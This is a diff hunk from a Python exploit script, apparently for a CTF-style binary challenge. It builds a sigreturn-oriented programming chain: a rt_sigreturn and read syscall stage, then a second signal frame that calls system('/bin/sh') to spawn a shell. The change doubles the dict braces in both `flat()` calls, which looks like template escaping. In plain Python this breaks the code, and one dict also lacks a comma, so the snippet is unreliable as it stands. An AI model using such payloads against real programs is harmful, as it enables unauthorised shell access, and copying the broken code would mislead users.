@@ -74,14 +74,14 @@ def exploit(*args, **kwargs):
 
 	pl = b""
 
-	pl += flat({
+	pl += flat({{
 		0x0 : p_rax_syscall_r,	# ret
 		0x8 : 15,	# rt_sigreturn
 		0x10: p_rdi_r,
 		0x18: 0,	# read fd
 		0x20: syscall_r,
 		0x28: sigFrame,
-	}, filler=b'\0')
+	}}, filler=b'\0')
 
     # - 2nd sigFrame: system('/bin/sh\x00')
 	sigFrame = SigreturnFrame()
@@ -91,12 +91,12 @@ def exploit(*args, **kwargs):
 	sigFrame.rdx = 0x0
 	sigFrame.rip = syscall_r
 
-	pl += flat({
+	pl += flat({{
 		0x0:  p_rax_syscall_r,
 		0x8:  15,	
 		0x10: syscall_r
 		0x18: sigFrame,
-	}, filler=b'\0')
+	}}, filler=b'\0')
 
 	pl += b'/bin/sh\x00'
 
